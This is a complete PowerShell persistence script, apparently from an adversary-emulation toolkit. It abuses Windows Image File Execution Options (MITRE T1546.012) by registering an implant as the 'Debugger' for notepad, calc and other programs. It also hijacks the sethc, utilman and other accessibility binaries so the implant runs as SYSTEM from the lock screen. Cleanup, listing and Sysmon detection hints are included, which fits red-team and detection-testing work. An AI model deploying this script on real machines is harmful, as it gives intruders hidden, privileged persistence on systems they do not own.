# persist_10_ifeo.ps1 -- Image File Execution Options (IFEO) Debugger Persistence
# MITRE ATT&CK: T1546.012
# Requires: Admin
# Detection: Sysmon EventID 13 (Registry key: Image File Execution Options)

param(
    [string]$ImplantPath = "$env:LOCALAPPDATA\Microsoft\update.exe",

    [ValidateSet("notepad", "mspaint", "calc", "sethc", "utilman", "osk", "narrator", "magnify", "custom")]
    [string]$Target = "notepad",

    [string]$CustomTarget = "",
    [switch]$Cleanup,
    [switch]$ListAll
)

$ErrorActionPreference = "Stop"

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] This script requires Administrator privileges!" -ForegroundColor Red
    exit 1
}

$targetMap = @{
    "notepad"  = "notepad.exe"
    "mspaint"  = "mspaint.exe"
    "calc"     = "calc.exe"
    "sethc"    = "sethc.exe"
    "utilman"  = "utilman.exe"
    "osk"      = "osk.exe"
    "narrator" = "Narrator.exe"
    "magnify"  = "Magnify.exe"
}

function Install-IFEO {
    $targetExe = if ($Target -eq "custom") { $CustomTarget } else { $targetMap[$Target] }
    if (-not $targetExe) {
        Write-Host "[-] Invalid target" -ForegroundColor Red
        return
    }

    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$targetExe"

    Write-Host "[*] IFEO Debugger Persistence" -ForegroundColor Cyan
    Write-Host "    MITRE: T1546.012"
    Write-Host "    Target: $targetExe"
    Write-Host "    Debugger: $ImplantPath"

    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }

    Set-ItemProperty -Path $regPath -Name "Debugger" -Value $ImplantPath -Type String
    Write-Host "    [+] IFEO Debugger set"

    Write-Host ""
    if ($Target -in @("sethc", "utilman", "osk", "narrator", "magnify")) {
        Write-Host "    [!] ACCESSIBILITY HIJACK!" -ForegroundColor Red
        Write-Host "    [!] This works at the LOGIN/LOCK SCREEN" -ForegroundColor Red
        Write-Host ""
        switch ($Target) {
            "sethc"    { Write-Host "    Trigger: Press SHIFT 5 times at lock screen" }
            "utilman"  { Write-Host "    Trigger: Press Win+U at lock screen" }
            "osk"      { Write-Host "    Trigger: Click Ease of Access -> On-Screen Keyboard" }
            "narrator" { Write-Host "    Trigger: Click Ease of Access -> Narrator" }
            "magnify"  { Write-Host "    Trigger: Click Ease of Access -> Magnifier" }
        }
        Write-Host "    Result: $ImplantPath runs as NT AUTHORITY\SYSTEM"
    } else {
        Write-Host "    [!] How it works:" -ForegroundColor Yellow
        Write-Host "        User opens $targetExe -> Windows runs $ImplantPath instead"
        Write-Host "        Implant runs with same privileges as the user"
    }

    Write-Host ""
    Write-Host "    [DETECTION] Sysmon EventID 13:" -ForegroundColor Red
    Write-Host "    Registry: HKLM\...\Image File Execution Options\$targetExe\Debugger" -ForegroundColor Red
}

function Remove-IFEO {
    $targetExe = if ($Target -eq "custom") { $CustomTarget } else { $targetMap[$Target] }

    Write-Host "[*] Cleaning up IFEO..." -ForegroundColor Yellow

    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$targetExe"
    $silentPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$targetExe"

    if (Test-Path $regPath) {
        Remove-ItemProperty -Path $regPath -Name "Debugger" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $regPath -Name "GlobalFlag" -ErrorAction SilentlyContinue
        $remaining = Get-ItemProperty $regPath -ErrorAction SilentlyContinue
        if (-not $remaining.PSObject.Properties.Where({$_.Name -notlike "PS*"})) {
            Remove-Item $regPath -Force -ErrorAction SilentlyContinue
        }
        Write-Host "    [+] IFEO key cleaned"
    }

    if (Test-Path $silentPath) {
        Remove-Item $silentPath -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "    [+] SilentProcessExit key removed"
    }

    Write-Host "    [+] Cleanup complete for $targetExe"
}

function List-IFEO {
    Write-Host "[*] Current IFEO entries with Debugger values:" -ForegroundColor Cyan

    $basePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
    Get-ChildItem $basePath -ErrorAction SilentlyContinue | ForEach-Object {
        $debugger = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).Debugger
        $globalFlag = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).GlobalFlag
        if ($debugger -or $globalFlag) {
            $name = Split-Path $_.PSPath -Leaf
            Write-Host "    $name" -ForegroundColor Yellow -NoNewline
            if ($debugger) { Write-Host " -> Debugger: $debugger" -ForegroundColor Red }
            if ($globalFlag) { Write-Host " -> GlobalFlag: 0x$($globalFlag.ToString('X'))" -ForegroundColor Red }
        }
    }
}

# --- Main ---
if ($Cleanup) {
    Remove-IFEO
} elseif ($ListAll) {
    List-IFEO
} else {
    Install-IFEO
}
